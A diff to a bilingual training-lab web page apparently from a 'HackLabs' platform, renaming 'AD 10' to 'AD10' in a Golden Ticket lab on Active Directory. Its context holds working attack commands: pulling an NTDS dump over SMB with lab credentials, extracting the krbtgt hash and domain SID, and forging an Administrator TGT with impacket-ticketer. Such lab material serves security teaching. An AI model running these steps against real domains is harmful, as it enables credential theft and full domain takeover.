@@ -1,12 +1,12 @@
 {% extends "base.html" %}
-{% block title %}AD 13 – Golden Ticket – HackLabs{% endblock %}
+{% block title %}AD13 – Golden Ticket – HackLabs{% endblock %}
 {% block content %}
 <div class="p-6 max-w-3xl mx-auto">
   {% include '_lab_header.html' %}
 
   <div class="hl-card mb-4">
     <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
-    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_golden_ticket_obj_desc">El hash de krbtgt (obtenido en el lab AD 10) firma todos los TGT del dominio. Fórjate un TGT arbitrario con la identidad que quieras y demuestra su validez descifrándolo con la misma clave.</p>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_golden_ticket_obj_desc">El hash de krbtgt (obtenido en el lab AD10) firma todos los TGT del dominio. Fórjate un TGT arbitrario con la identidad que quieras y demuestra su validez descifrándolo con la misma clave.</p>
     <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>verificación local del ticket forjado</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la caja «Validar Flag» al final de esta página.</span></p>
   </div>
 
@@ -19,7 +19,7 @@
 
   <div class="hl-card mb-4">
     <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
-    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Forjar el TGT con el hash de krbtgt (del lab AD 10)
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Forjar el TGT con el hash de krbtgt (del lab AD10)
 impacket-ticketer -nthash '&lt;hash_NT_krbtgt&gt;' -domain-sid '&lt;DOMAIN_SID&gt;' \
   -domain {{ ad_realm_lower }} Administrator
 
@@ -33,7 +33,7 @@ python3 verify_ticket.py Administrator.ccache '&lt;hash_NT_krbtgt&gt;' Administr
     <h3>1 · Por qué es el premio gordo</h3>
     <p>Todo TGT del dominio va cifrado y firmado con la clave de la cuenta <code>krbtgt</code>. Si tienes su hash, puedes fabricar un TGT <em>arbitrario</em>: cualquier usuario (incluso uno inexistente), en cualquier grupo (incluidos Domain Admins), con la caducidad que quieras. El KDC lo aceptará como legítimo porque la firma cuadra. Es persistencia total del dominio hasta que se rote <strong>dos veces</strong> el hash de krbtgt.</p>
 
-    <h3>2 · Reunir los ingredientes (del lab AD 10)</h3>
+    <h3>2 · Reunir los ingredientes (del lab AD10)</h3>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
 export KRBTGT_NT=$(grep 'krbtgt' ntds_dump.txt | cut -d: -f4)
 export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
@@ -98,7 +98,7 @@ Flag: HL{···}</pre>
     <h3>1 · Why it's the jackpot</h3>
     <p>Every TGT in the domain is encrypted and signed with the <code>krbtgt</code> account key. If you have its hash you can craft an <em>arbitrary</em> TGT: any user (even a non-existent one), in any group (including Domain Admins), with any lifetime you like. The KDC accepts it as legitimate because the signature checks out. It is full domain persistence until the krbtgt hash is rotated <strong>twice</strong>.</p>
 
-    <h3>2 · Gather the ingredients (from lab AD 10)</h3>
+    <h3>2 · Gather the ingredients (from lab AD10)</h3>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
 export KRBTGT_NT=$(grep 'krbtgt' ntds_dump.txt | cut -d: -f4)
 export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
